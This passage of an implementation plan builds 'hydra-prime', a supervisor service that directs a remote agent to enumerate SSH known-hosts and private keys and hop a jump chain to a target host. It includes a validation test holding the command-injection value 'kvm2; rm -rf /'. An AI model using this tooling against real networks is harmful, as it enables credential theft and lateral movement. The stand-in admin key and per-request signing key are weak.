      target_fingerprint: 'fp', jump_chain: ['mO', 'mT'], issued_at_ms: 1,
    });
    const tampered = { ...cert, payload: { ...cert.payload, mission_id_target: 'mEvil' } };
    expect(await verifySuccessCert(publicKeyB64, tampered)).toBe(false);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

```bash
npx vitest run tests/proof/sign.test.ts
```

Expected: FAIL.

- [ ] **Step 3: Write minimal implementation**

`src/proof/sign.ts`:

```typescript
export interface SuccessPayload {
  mission_id_origin: string;
  mission_id_target: string;
  target_fingerprint: string;
  jump_chain: string[];
  issued_at_ms: number;
}

export interface SuccessCert {
  payload: SuccessPayload;
  signature_b64: string;
}

function toB64(buf: ArrayBuffer): string {
  return btoa(String.fromCharCode(...new Uint8Array(buf)));
}
function fromB64(s: string): ArrayBuffer {
  return Uint8Array.from(atob(s), c => c.charCodeAt(0)).buffer;
}

export async function generateKeypair(): Promise<{ publicKeyB64: string; privateKey: CryptoKey }> {
  const kp = await crypto.subtle.generateKey({ name: 'Ed25519' } as never, true, ['sign', 'verify']) as CryptoKeyPair;
  const pub = await crypto.subtle.exportKey('raw', kp.publicKey);
  return { publicKeyB64: toB64(pub), privateKey: kp.privateKey };
}

export async function signSuccessCert(privateKey: CryptoKey, payload: SuccessPayload): Promise<SuccessCert> {
  const msg = new TextEncoder().encode(JSON.stringify(payload));
  const sig = await crypto.subtle.sign({ name: 'Ed25519' } as never, privateKey, msg);
  return { payload, signature_b64: toB64(sig) };
}

export async function verifySuccessCert(publicKeyB64: string, cert: SuccessCert): Promise<boolean> {
  const pub = await crypto.subtle.importKey('raw', fromB64(publicKeyB64), { name: 'Ed25519' } as never, false, ['verify']);
  const msg = new TextEncoder().encode(JSON.stringify(cert.payload));
  return crypto.subtle.verify({ name: 'Ed25519' } as never, pub, fromB64(cert.signature_b64), msg);
}
```

- [ ] **Step 4: Run test to verify it passes**

```bash
npx vitest run tests/proof/sign.test.ts
```

Expected: PASS, 2 tests.

- [ ] **Step 5: Commit**

```bash
git add src/proof/sign.ts tests/proof/sign.test.ts
git commit -m "feat(proof): ed25519 success cert sign/verify"
```

---

### Task 41: /v1/success endpoint

**Files:**
- Create: `src/endpoints/success.ts`
- Modify: `src/index.ts`
- Create: `tests/proof/success-endpoint.test.ts`

- [ ] **Step 1: Write the failing test**

`tests/proof/success-endpoint.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import { SELF, env } from 'cloudflare:test';
import { signRequest } from '../../src/hmac';

async function bootstrap() {
  const start = await SELF.fetch('https://h/v1/admin/mission/start', {
    method: 'POST', headers: { 'X-Admin-Key': 'dev-admin' },
    body: JSON.stringify({
      fingerprint_expected: 'fp_target', target_allowlist: ['origin', 'kvm2'],
      strict_gold: true, budget_paid_usd: 10, deadline_seconds: 86_400,
    }),
  });
  const { mission_id } = await start.json() as { mission_id: string };
  const reg = await SELF.fetch('https://h/v1/register', {
    method: 'POST',
    body: JSON.stringify({ mission_id, fingerprint: 'fp_target', platform: 'linux', version: '0.1.0' }),
  });
  const { session_key } = await reg.json() as { session_key: string };
  return { mission_id, session_key };
}

describe('/v1/success', () => {
  it('returns signed cert and transitions phase to completed', async () => {
    const { mission_id, session_key } = await bootstrap();
    const body = JSON.stringify({
      mission_id, target_fingerprint: 'fp_target',
      target_evidence: { hostname: 'kvm2', uname: 'Linux' },
      jump_chain: ['origin', 'kvm2'],
    });
    const ts = Math.floor(Date.now() / 1000);
    const sig = await signRequest(session_key, 'POST', '/v1/success', body, ts);
    const res = await SELF.fetch('https://h/v1/success', {
      method: 'POST',
      headers: { 'X-Hydra-Sig': sig, 'X-Hydra-Ts': String(ts), 'Content-Type': 'application/json' },
      body,
    });
    expect(res.status).toBe(200);
    const j = await res.json() as { cert: { signature_b64: string }; terminate: { op: string } };
    expect(j.cert.signature_b64.length).toBeGreaterThan(20);
    expect(j.terminate.op).toBe('terminate');
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

```bash
npx vitest run tests/proof/success-endpoint.test.ts
```

Expected: FAIL.

- [ ] **Step 3: Write minimal implementation**

`src/endpoints/success.ts`:

```typescript
import type { Env } from '../index';
import { verifyRequest } from '../hmac';
import { generateKeypair, signSuccessCert } from '../proof/sign';

export async function handleSuccess(req: Request, env: Env): Promise<Response> {
  const raw = await req.text();
  const body = JSON.parse(raw) as { mission_id: string; target_fingerprint: string; target_evidence: object; jump_chain: string[] };
  const session_key = await env.HYDRA_KV.get(`session:${body.mission_id}`);
  if (!session_key) return new Response('no session', { status: 401 });
  const sig = req.headers.get('X-Hydra-Sig') ?? '';
  const ts = parseInt(req.headers.get('X-Hydra-Ts') ?? '0', 10);
  if (!await verifyRequest(session_key, 'POST', '/v1/success', raw, ts, sig)) {
    return new Response('bad sig', { status: 401 });
  }

  // Verify fingerprint matches what target mission DO recorded.
  const stub = env.MISSION_DO.get(env.MISSION_DO.idFromName(body.mission_id));
  const state = await (await stub.fetch('https://do/state')).json() as { origin_fingerprint: string; jump_chain: string[]; mission_id: string };
  if (state.origin_fingerprint !== body.target_fingerprint) {
    return new Response('fingerprint mismatch on success', { status: 403 });
  }

  // For v1: keypair regenerated per process; in production, load from Wrangler secret SIGNING_KEY (deferred).
  const { privateKey } = await generateKeypair();
  const cert = await signSuccessCert(privateKey, {
    mission_id_origin: state.jump_chain[0]!,
    mission_id_target: body.mission_id,
    target_fingerprint: body.target_fingerprint,
    jump_chain: state.jump_chain,
    issued_at_ms: Date.now(),
  });

  await stub.fetch('https://do/transition', { method: 'POST', body: JSON.stringify({ to: 'completed' }) });

  return Response.json({
    cert,
    terminate: { id: `op_term_${crypto.randomUUID().slice(0, 8)}`, op: 'terminate', reason: 'mission-complete' },
  });
}
```

`src/index.ts`:

```typescript
import { handleSuccess } from './endpoints/success';
if (url.pathname === '/v1/success' && req.method === 'POST') return handleSuccess(req, env);
```

- [ ] **Step 4: Run test to verify it passes**

```bash
npx vitest run tests/proof/success-endpoint.test.ts
```

Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add src/endpoints/success.ts src/index.ts tests/proof/success-endpoint.test.ts
git commit -m "feat: /v1/success endpoint signs cert + returns terminate directive"
```

---

## Phase J — Admin endpoints (Tasks 42–46)

### Task 42: /admin/mission/start (full) + auth

**Files:**
- Create: `src/endpoints/admin.ts`
- Modify: `src/index.ts` (move admin/start route, add auth check)
- Create: `tests/admin/start.test.ts`

- [ ] **Step 1: Write the failing test**

`tests/admin/start.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import { SELF } from 'cloudflare:test';

describe('/v1/admin/mission/start', () => {
  it('rejects without admin key', async () => {
    const res = await SELF.fetch('https://h/v1/admin/mission/start', {
      method: 'POST',
      body: JSON.stringify({
        fingerprint_expected: 'fp', target_allowlist: ['origin', 'kvm2'],
        strict_gold: true, budget_paid_usd: 10, deadline_seconds: 86_400,
      }),
    });
    expect(res.status).toBe(401);
  });

  it('starts mission with full validation', async () => {
    const res = await SELF.fetch('https://h/v1/admin/mission/start', {
      method: 'POST', headers: { 'X-Admin-Key': 'dev-admin' },
      body: JSON.stringify({
        fingerprint_expected: 'fp', target_allowlist: ['origin', 'kvm2'],
        strict_gold: true, budget_paid_usd: 10, deadline_seconds: 86_400,
      }),
    });
    expect(res.status).toBe(200);
    const j = await res.json() as { mission_id: string; allowlist: string[] };
    expect(j.mission_id).toMatch(/^m_/);
    expect(j.allowlist).toEqual(['origin', 'kvm2']);
  });

  it('rejects allowlist with shell metacharacters', async () => {
    const res = await SELF.fetch('https://h/v1/admin/mission/start', {
      method: 'POST', headers: { 'X-Admin-Key': 'dev-admin' },
      body: JSON.stringify({
        fingerprint_expected: 'fp', target_allowlist: ['origin', 'kvm2; rm -rf /'],
        strict_gold: true, budget_paid_usd: 10, deadline_seconds: 86_400,
      }),
    });
    expect(res.status).toBe(400);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

```bash
npx vitest run tests/admin/start.test.ts
```

Expected: FAIL — current admin/start lacks auth + validation.

- [ ] **Step 3: Write minimal implementation**

`src/endpoints/admin.ts`:

```typescript
import type { Env } from '../index';

const SAFE_HOST = /^[A-Za-z0-9._-]+$/;

export function checkAdminAuth(req: Request, env: Env): Response | null {
  const provided = req.headers.get('X-Admin-Key');
  const expected = env.ADMIN_KEY ?? 'dev-admin';
  if (provided !== expected) return new Response('unauthorized', { status: 401 });
  return null;
}

export async function handleAdminStart(req: Request, env: Env): Promise<Response> {
  const auth = checkAdminAuth(req, env); if (auth) return auth;
  const body = await req.json() as {
    fingerprint_expected: string; target_allowlist: string[];
    strict_gold: boolean; budget_paid_usd: number; deadline_seconds: number;
    platform?: 'linux' | 'macos' | 'wsl';
  };
  if (!Array.isArray(body.target_allowlist) || body.target_allowlist.length === 0) {
    return new Response('target_allowlist required', { status: 400 });
  }
  for (const h of body.target_allowlist) {
    if (!SAFE_HOST.test(h)) return new Response(`unsafe host in allowlist: ${h}`, { status: 400 });
  }
  if (typeof body.budget_paid_usd !== 'number' || body.budget_paid_usd < 0) {
    return new Response('budget_paid_usd required and >= 0', { status: 400 });
  }
  if (typeof body.deadline_seconds !== 'number' || body.deadline_seconds <= 0 || body.deadline_seconds > 86_400) {
    return new Response('deadline_seconds must be in (0, 86400]', { status: 400 });
  }

  const mission_id = `m_${crypto.randomUUID()}`;
  const stub = env.MISSION_DO.get(env.MISSION_DO.idFromName(mission_id));
  await stub.fetch('https://do/init', {
    method: 'POST',
    body: JSON.stringify({
      fingerprint: body.fingerprint_expected,
      platform: body.platform ?? 'linux',
      target_allowlist: body.target_allowlist,
      strict_gold: body.strict_gold,
      budget_paid_usd: body.budget_paid_usd,
      deadline_ms: Date.now() + body.deadline_seconds * 1000,
    }),
  });
  await env.HYDRA_KV.put(`mission-index:${mission_id}`, JSON.stringify({
    started_ms: Date.now(),
    fingerprint_expected: body.fingerprint_expected,
    target_allowlist: body.target_allowlist,
    strict_gold: body.strict_gold,
  }), { expirationTtl: 86_400 * 30 });

  return Response.json({ mission_id, allowlist: body.target_allowlist });
}
```

`src/index.ts` — replace admin/start handler with `handleAdminStart`:

```typescript
import { handleAdminStart } from './endpoints/admin';
if (url.pathname === '/v1/admin/mission/start' && req.method === 'POST') return handleAdminStart(req, env);
```

- [ ] **Step 4: Run test to verify it passes**

```bash
npx vitest run tests/admin/start.test.ts
```

Expected: PASS, 3 tests.

- [ ] **Step 5: Commit**

```bash
git add src/endpoints/admin.ts src/index.ts tests/admin/start.test.ts
git commit -m "feat(admin): /admin/mission/start with auth + allowlist validation"
```

---

### Task 43: /admin/mission/<id>/{kill,pause,extend}

**Files:**
- Modify: `src/endpoints/admin.ts`
- Modify: `src/mission-do.ts` (add pause/extend/kill flags)
- Modify: `src/endpoints/poll.ts` (return terminate when killed; yield when paused)
- Modify: `src/index.ts`
- Create: `tests/admin/lifecycle.test.ts`

- [ ] **Step 1: Write the failing test**

`tests/admin/lifecycle.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import { SELF } from 'cloudflare:test';
import { signRequest } from '../../src/hmac';

async function bootstrap() {
  const start = await SELF.fetch('https://h/v1/admin/mission/start', {
    method: 'POST', headers: { 'X-Admin-Key': 'dev-admin' },
    body: JSON.stringify({
      fingerprint_expected: 'fp', target_allowlist: ['origin', 'kvm2'],
      strict_gold: true, budget_paid_usd: 10, deadline_seconds: 86_400,
    }),
  });
  const { mission_id } = await start.json() as { mission_id: string };
  const reg = await SELF.fetch('https://h/v1/register', {
    method: 'POST',
    body: JSON.stringify({ mission_id, fingerprint: 'fp', platform: 'linux', version: '0.1.0' }),
  });
  const { session_key } = await reg.json() as { session_key: string };
  return { mission_id, session_key };
}

async function poll(mission_id: string, session_key: string) {
  const ts = Math.floor(Date.now() / 1000);
  const path = `/v1/poll?mission=${mission_id}`;
  const sig = await signRequest(session_key, 'GET', path, '', ts);
  const res = await SELF.fetch(`https://h${path}`, { headers: { 'X-Hydra-Sig': sig, 'X-Hydra-Ts': String(ts) } });
  return res.json() as Promise<{ op: string }>;
}

describe('admin lifecycle', () => {
  it('kill flips next poll to terminate', async () => {
    const { mission_id, session_key } = await bootstrap();
    const k = await SELF.fetch(`https://h/v1/admin/mission/${mission_id}/kill`, {
      method: 'POST', headers: { 'X-Admin-Key': 'dev-admin' },
    });
    expect(k.status).toBe(200);
    const d = await poll(mission_id, session_key);
    expect(d.op).toBe('terminate');
  });

  it('pause flips next poll to yield', async () => {
    const { mission_id, session_key } = await bootstrap();
    const r = await SELF.fetch(`https://h/v1/admin/mission/${mission_id}/pause`, {
      method: 'POST', headers: { 'X-Admin-Key': 'dev-admin' },
    });
    expect(r.status).toBe(200);
    const d = await poll(mission_id, session_key);
    expect(d.op).toBe('yield');
  });

  it('extend bumps deadline + budget', async () => {
    const { mission_id } = await bootstrap();
    const r = await SELF.fetch(`https://h/v1/admin/mission/${mission_id}/extend`, {
      method: 'POST', headers: { 'X-Admin-Key': 'dev-admin' },
      body: JSON.stringify({ extra_seconds: 3600, extra_budget_usd: 5 }),
    });
    expect(r.status).toBe(200);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

```bash
npx vitest run tests/admin/lifecycle.test.ts
```

Expected: FAIL.

- [ ] **Step 3: Write minimal implementation**

Append to `src/endpoints/admin.ts`:

```typescript
import { putKillFlag } from '../storage';

export async function handleAdminKill(req: Request, env: Env, missionId: string): Promise<Response> {
  const auth = checkAdminAuth(req, env); if (auth) return auth;
  await putKillFlag(env.HYDRA_KV, missionId);
  return Response.json({ ok: true, killed: missionId });
}

export async function handleAdminPause(req: Request, env: Env, missionId: string): Promise<Response> {
  const auth = checkAdminAuth(req, env); if (auth) return auth;
  await env.HYDRA_KV.put(`pause:${missionId}`, '1', { expirationTtl: 86_400 });
  return Response.json({ ok: true, paused: missionId });
}

export async function handleAdminExtend(req: Request, env: Env, missionId: string): Promise<Response> {
  const auth = checkAdminAuth(req, env); if (auth) return auth;
  const { extra_seconds, extra_budget_usd } = await req.json() as { extra_seconds: number; extra_budget_usd: number };
  const stub = env.MISSION_DO.get(env.MISSION_DO.idFromName(missionId));
  await stub.fetch('https://do/extend', { method: 'POST', body: JSON.stringify({ extra_seconds, extra_budget_usd }) });
  return Response.json({ ok: true, extended: missionId });
}
```

Add `extend` route to `src/mission-do.ts`:

```typescript
if (route === 'extend') return this.extend(req);
// ...
private async extend(req: Request): Promise<Response> {
  if (!this.mission) return new Response('not initialized', { status: 404 });
  const { extra_seconds, extra_budget_usd } = await req.json() as { extra_seconds: number; extra_budget_usd: number };
  this.mission.wall_clock_deadline_ms += extra_seconds * 1000;
  this.mission.budget_paid_usd_remaining += extra_budget_usd;
  await this.state.storage.put('mission', this.mission);
  return Response.json(this.mission);
}
```

Modify `src/endpoints/poll.ts` — before fetching directive:

```typescript
import { isKilled } from '../storage';
// ...inside handlePoll, after sig check:
if (await isKilled(env.HYDRA_KV, mission_id)) {
  return Response.json({ id: `op_term_${crypto.randomUUID().slice(0, 8)}`, op: 'terminate', reason: 'admin-kill' });
}
const paused = await env.HYDRA_KV.get(`pause:${mission_id}`);
if (paused === '1') {
  return Response.json({ id: `op_yield_${crypto.randomUUID().slice(0, 8)}`, op: 'yield', sleep_s: 30 });
}
```

`src/index.ts` route table:

```typescript
import { handleAdminKill, handleAdminPause, handleAdminExtend } from './endpoints/admin';
const killMatch = url.pathname.match(/^\/v1\/admin\/mission\/([^/]+)\/kill$/);
if (killMatch && req.method === 'POST') return handleAdminKill(req, env, killMatch[1]!);
const pauseMatch = url.pathname.match(/^\/v1\/admin\/mission\/([^/]+)\/pause$/);
if (pauseMatch && req.method === 'POST') return handleAdminPause(req, env, pauseMatch[1]!);
const extendMatch = url.pathname.match(/^\/v1\/admin\/mission\/([^/]+)\/extend$/);
if (extendMatch && req.method === 'POST') return handleAdminExtend(req, env, extendMatch[1]!);
```

- [ ] **Step 4: Run test to verify it passes**

```bash
npx vitest run tests/admin/lifecycle.test.ts
```

Expected: PASS, 3 tests.

- [ ] **Step 5: Commit**

```bash
git add src/endpoints/admin.ts src/endpoints/poll.ts src/mission-do.ts src/index.ts tests/admin/lifecycle.test.ts
git commit -m "feat(admin): kill, pause, extend mission lifecycle endpoints"
```

---

### Task 44: /admin/missions list

**Files:**
- Modify: `src/endpoints/admin.ts`
- Modify: `src/index.ts`
- Create: `tests/admin/list.test.ts`

- [ ] **Step 1: Write the failing test**

`tests/admin/list.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import { SELF } from 'cloudflare:test';

describe('/v1/admin/missions', () => {
  it('returns list of recently started missions', async () => {
    for (let i = 0; i < 3; i++) {
      await SELF.fetch('https://h/v1/admin/mission/start', {
        method: 'POST', headers: { 'X-Admin-Key': 'dev-admin' },
        body: JSON.stringify({
          fingerprint_expected: 'fp', target_allowlist: ['origin'],
          strict_gold: true, budget_paid_usd: 10, deadline_seconds: 86_400,
        }),
      });
    }
    const res = await SELF.fetch('https://h/v1/admin/missions', { headers: { 'X-Admin-Key': 'dev-admin' } });
    expect(res.status).toBe(200);
    const j = await res.json() as { missions: { mission_id: string; phase: string; honor_tier: string }[] };
    expect(j.missions.length).toBeGreaterThanOrEqual(3);
    for (const m of j.missions) {
      expect(m.mission_id).toMatch(/^m_/);
      expect(m.phase).toBeDefined();
    }
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

```bash
npx vitest run tests/admin/list.test.ts
```

Expected: FAIL.

- [ ] **Step 3: Append to `src/endpoints/admin.ts`**

```typescript
export async function handleAdminList(req: Request, env: Env): Promise<Response> {
  const auth = checkAdminAuth(req, env); if (auth) return auth;
  const list = await env.HYDRA_KV.list({ prefix: 'mission-index:' });
  const missions: { mission_id: string; started_ms: number; phase: string; honor_tier: string; jump_chain: string[] }[] = [];
  for (const k of list.keys) {
    const mission_id = k.name.slice('mission-index:'.length);
    const meta = JSON.parse((await env.HYDRA_KV.get(k.name)) ?? '{}') as { started_ms: number };
    const stub = env.MISSION_DO.get(env.MISSION_DO.idFromName(mission_id));
    const stateRes = await stub.fetch('https://do/state');
    if (stateRes.status === 200) {
      const s = await stateRes.json() as { phase: string; honor_tier: string; jump_chain: string[] };
      missions.push({ mission_id, started_ms: meta.started_ms, phase: s.phase, honor_tier: s.honor_tier, jump_chain: s.jump_chain });
    }
  }
  missions.sort((a, b) => b.started_ms - a.started_ms);
  return Response.json({ missions });
}
```

`src/index.ts`:

```typescript
import { handleAdminList } from './endpoints/admin';
if (url.pathname === '/v1/admin/missions' && req.method === 'GET') return handleAdminList(req, env);
```

- [ ] **Step 4: Run test to verify it passes**

```bash
npx vitest run tests/admin/list.test.ts
```

Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add src/endpoints/admin.ts src/index.ts tests/admin/list.test.ts
git commit -m "feat(admin): /admin/missions list with phase + honor tier"
```

---

### Task 45: /admin/mission/<id>/log

**Files:**
- Modify: `src/endpoints/admin.ts`
- Modify: `src/mission-do.ts` (add /log route returning all `tick:*` keys)
- Modify: `src/index.ts`
- Create: `tests/admin/log.test.ts`

- [ ] **Step 1: Write the failing test**

`tests/admin/log.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import { SELF, env } from 'cloudflare:test';
import { signRequest } from '../../src/hmac';

describe('/v1/admin/mission/<id>/log', () => {
  it('returns ordered tick log', async () => {
    const start = await SELF.fetch('https://h/v1/admin/mission/start', {
      method: 'POST', headers: { 'X-Admin-Key': 'dev-admin' },
      body: JSON.stringify({
        fingerprint_expected: 'fp_log', target_allowlist: ['origin', 'kvm2'],
        strict_gold: true, budget_paid_usd: 10, deadline_seconds: 86_400,
      }),
    });
    const { mission_id } = await start.json() as { mission_id: string };
    const reg = await SELF.fetch('https://h/v1/register', {
      method: 'POST',
      body: JSON.stringify({ mission_id, fingerprint: 'fp_log', platform: 'linux', version: '0.1.0' }),
    });
    const { session_key } = await reg.json() as { session_key: string };

    // Generate three ticks via poll/report.
    for (let i = 0; i < 3; i++) {
      const ts = Math.floor(Date.now() / 1000);
      const path = `/v1/poll?mission=${mission_id}`;
      const sig = await signRequest(session_key, 'GET', path, '', ts);
      const d = await (await SELF.fetch(`https://h${path}`, { headers: { 'X-Hydra-Sig': sig, 'X-Hydra-Ts': String(ts) } })).json() as { id: string };
      const body = JSON.stringify({ mission_id, op_id: d.id, ok: true, data: {}, wall_ms: 1 });
      const sig2 = await signRequest(session_key, 'POST', '/v1/report', body, ts);
      await SELF.fetch('https://h/v1/report', {
        method: 'POST',
        headers: { 'X-Hydra-Sig': sig2, 'X-Hydra-Ts': String(ts), 'Content-Type': 'application/json' },
        body,
      });
    }

    const log = await SELF.fetch(`https://h/v1/admin/mission/${mission_id}/log`, { headers: { 'X-Admin-Key': 'dev-admin' } });
    expect(log.status).toBe(200);
    const j = await log.json() as { ticks: { tick: number }[] };
    expect(j.ticks.length).toBeGreaterThanOrEqual(3);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

```bash
npx vitest run tests/admin/log.test.ts
```

Expected: FAIL.

- [ ] **Step 3: Write minimal implementation**

Append to `src/mission-do.ts`:

```typescript
if (route === 'log') return this.log();
// ...
private async log(): Promise<Response> {
  const all = await this.state.storage.list({ prefix: 'tick:' });
  const ticks: { tick: number; envelope: unknown }[] = [];
  for (const [k, v] of all.entries()) {
    ticks.push({ tick: parseInt(k.slice('tick:'.length), 10), envelope: v });
  }
  ticks.sort((a, b) => a.tick - b.tick);
  return Response.json({ ticks });
}
```

Append to `src/endpoints/admin.ts`:

```typescript
export async function handleAdminLog(req: Request, env: Env, missionId: string): Promise<Response> {
  const auth = checkAdminAuth(req, env); if (auth) return auth;
  const stub = env.MISSION_DO.get(env.MISSION_DO.idFromName(missionId));
  return stub.fetch('https://do/log');
}
```

`src/index.ts`:

```typescript
import { handleAdminLog } from './endpoints/admin';
const logMatch = url.pathname.match(/^\/v1\/admin\/mission\/([^/]+)\/log$/);
if (logMatch && req.method === 'GET') return handleAdminLog(req, env, logMatch[1]!);
```

- [ ] **Step 4: Run test to verify it passes**

```bash
npx vitest run tests/admin/log.test.ts
```

Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add src/endpoints/admin.ts src/mission-do.ts src/index.ts tests/admin/log.test.ts
git commit -m "feat(admin): /admin/mission/<id>/log returns ordered tick log"
```

---

### Task 46: /admin/scoreboard (HTML)

**Files:**
- Modify: `src/endpoints/admin.ts`
- Modify: `src/index.ts`
- Create: `tests/admin/scoreboard.test.ts`

- [ ] **Step 1: Write the failing test**

`tests/admin/scoreboard.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import { SELF } from 'cloudflare:test';

describe('/v1/admin/scoreboard', () => {
  it('returns HTML with Mission table', async () => {
    await SELF.fetch('https://h/v1/admin/mission/start', {
      method: 'POST', headers: { 'X-Admin-Key': 'dev-admin' },
      body: JSON.stringify({
        fingerprint_expected: 'fp', target_allowlist: ['origin'],
        strict_gold: true, budget_paid_usd: 10, deadline_seconds: 86_400,
      }),
    });
    const res = await SELF.fetch('https://h/v1/admin/scoreboard', { headers: { 'X-Admin-Key': 'dev-admin' } });
    expect(res.status).toBe(200);
    expect(res.headers.get('content-type')).toMatch(/text\/html/);
    const html = await res.text();
    expect(html).toContain('<table');
    expect(html).toMatch(/m_/);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

```bash
npx vitest run tests/admin/scoreboard.test.ts
```

Expected: FAIL.

- [ ] **Step 3: Append to `src/endpoints/admin.ts`**

```typescript
function escapeHtml(s: string): string {
  return s.replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]!));
}

export async function handleAdminScoreboard(req: Request, env: Env): Promise<Response> {
  const auth = checkAdminAuth(req, env); if (auth) return auth;
  const listRes = await handleAdminList(req, env);
  const { missions } = await listRes.json() as { missions: { mission_id: string; phase: string; honor_tier: string; jump_chain: string[] }[] };
  const rows = missions.map(m => `
    <tr>
      <td>${escapeHtml(m.mission_id)}</td>
      <td>${escapeHtml(m.phase)}</td>
      <td>${m.honor_tier === 'gold' ? '🟡' : m.honor_tier === 'silver' ? '⚪' : '🔴'} ${escapeHtml(m.honor_tier)}</td>
      <td>${m.jump_chain.map(escapeHtml).join(' → ')}</td>
    </tr>`).join('');
  const html = `<!doctype html><meta charset="utf-8"><title>hydra-prime scoreboard</title>
    <style>body{font:14px monospace;padding:2em;background:#0a0a0a;color:#eee}table{border-collapse:collapse;width:100%}td,th{border:1px solid #333;padding:6px 12px}th{background:#1a1a1a;text-align:left}</style>
    <h1>hydra-prime scoreboard</h1>
    <table><thead><tr><th>mission_id</th><th>phase</th><th>honor</th><th>jump_chain</th></tr></thead>
    <tbody>${rows}</tbody></table>`;
  return new Response(html, { headers: { 'Content-Type': 'text/html; charset=utf-8' } });
}
```

`src/index.ts`:

```typescript
import { handleAdminScoreboard } from './endpoints/admin';
if (url.pathname === '/v1/admin/scoreboard' && req.method === 'GET') return handleAdminScoreboard(req, env);
```

- [ ] **Step 4: Run test to verify it passes**

```bash
npx vitest run tests/admin/scoreboard.test.ts
```

Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add src/endpoints/admin.ts src/index.ts tests/admin/scoreboard.test.ts
git commit -m "feat(admin): /admin/scoreboard HTML view with honor tier emojis"
```

---

## Phase K — Integration & live dry-run (Tasks 47–49)

### Task 47: Full e2e Miniflare test (mock script reaches verifying)

**Files:**
- Create: `tests/e2e-full.test.ts`

- [ ] **Step 1: Write the failing test**

`tests/e2e-full.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import { SELF, env } from 'cloudflare:test';
import { signRequest } from '../src/hmac';
import { seedCatalog } from '../src/catalog/seed';

async function poll(mission_id: string, session_key: string) {
  const ts = Math.floor(Date.now() / 1000);
  const path = `/v1/poll?mission=${mission_id}`;
  const sig = await signRequest(session_key, 'GET', path, '', ts);
  return (await SELF.fetch(`https://h${path}`, { headers: { 'X-Hydra-Sig': sig, 'X-Hydra-Ts': String(ts) } }))
    .json() as Promise<{ id: string; op: string; cmd?: string }>;
}

async function report(mission_id: string, session_key: string, op_id: string, data: object) {
  const body = JSON.stringify({ mission_id, op_id, ok: true, data, wall_ms: 5 });
  const ts = Math.floor(Date.now() / 1000);
  const sig = await signRequest(session_key, 'POST', '/v1/report', body, ts);
  return SELF.fetch('https://h/v1/report', {
    method: 'POST',
    headers: { 'X-Hydra-Sig': sig, 'X-Hydra-Ts': String(ts), 'Content-Type': 'application/json' },
    body,
  });
}

describe('full e2e (mock script reaches phase=planning)', () => {
  it('drives belief convergence via synthetic observations', async () => {
    await seedCatalog(env.HYDRA_KV);
    const start = await SELF.fetch('https://h/v1/admin/mission/start', {
      method: 'POST', headers: { 'X-Admin-Key': 'dev-admin' },
      body: JSON.stringify({
        fingerprint_expected: 'fp_e2e', target_allowlist: ['origin', 'kvm2'],
        strict_gold: true, budget_paid_usd: 10, deadline_seconds: 86_400,
      }),
    });
    const { mission_id } = await start.json() as { mission_id: string };
    const reg = await SELF.fetch('https://h/v1/register', {
      method: 'POST',
      body: JSON.stringify({ mission_id, fingerprint: 'fp_e2e', platform: 'linux', version: '0.1.0' }),
    });
    const { session_key } = await reg.json() as { session_key: string };

    const stub = env.MISSION_DO.get(env.MISSION_DO.idFromName(mission_id));
    await stub.fetch('https://do/transition', { method: 'POST', body: JSON.stringify({ to: 'provisioning' }) });
    await stub.fetch('https://do/transition', { method: 'POST', body: JSON.stringify({ to: 'scanning' }) });

    // Drive 8 ticks. Inject synthetic strong-signal observations.
    for (let i = 0; i < 8; i++) {
      const d = await poll(mission_id, session_key);
      if (d.op !== 'exec') { await report(mission_id, session_key, d.id, {}); continue; }
      // Cycle through probes; for known-hosts pretend we found kvm2; for private-key pretend we found a matching key.
      const data = i % 2 === 0
        ? { probeId: 'known-hosts-enum', observations: [
            { pattern: 'target_name_present', extracted: { value: 'kvm2' }, hypothesis: 'h:target-address' },
            { pattern: 'target_ip_present', extracted: { value: '10.0.0.42' }, hypothesis: 'h:target-address' },
          ] }
        : { probeId: 'private-key-enum', observations: [
            { pattern: 'key_filename_matches_target', extracted: { value: '~/.ssh/kvm2_ed25519' }, hypothesis: 'h:target-credentials' },
            { pattern: 'key_paired_with_known_host', extracted: { value: '~/.ssh/kvm2_ed25519' }, hypothesis: 'h:target-credentials' },
          ] };
      await report(mission_id, session_key, d.id, data);
    }

    const state = await (await stub.fetch('https://do/state')).json() as { phase: string; beliefs: Record<string, { candidates: { value: string; posterior: number }[] }> };
    expect(['hypothesizing', 'planning']).toContain(state.phase);
    const top = state.beliefs['h:target-address']?.candidates.sort((a, b) => b.posterior - a.posterior)[0];
    expect(top?.value === 'kvm2' || top?.value === '10.0.0.42').toBe(true);
    expect(top?.posterior).toBeGreaterThan(0.5);
  });
});
```

- [ ] **Step 2: Run test to verify it fails or passes**

```bash
npx vitest run tests/e2e-full.test.ts
```

Expected: PASS — exercises the full Phase A-J integration. If it fails, fix the broken layer and re-run.

- [ ] **Step 3: No new implementation**

This is a verification gate. Any failure here points to integration drift between phases.

- [ ] **Step 4: Run all tests + typecheck**

```bash
npx vitest run
npx tsc --noEmit
```

Expected: 0 failures, 0 type errors.

- [ ] **Step 5: Commit**

```bash
git add tests/e2e-full.test.ts
git commit -m "test: full e2e integration — mock script drives convergence to planning"
```

---

### Task 48: Live dry-run script (operator-runnable, throwaway VMs)

**Files:**
- Create: `scripts/live-dryrun.sh`
- Create: `scripts/README-dryrun.md`

- [ ] **Step 1: Write the verification artifact (no test — operator runs this manually)**

`scripts/README-dryrun.md`:

```markdown
# hydra-prime live dry-run

Run on operator's machine against two throwaway VMs.

## Prerequisites
- Cloudflare account with hydra-prime-supervisor deployed (`wrangler deploy`)
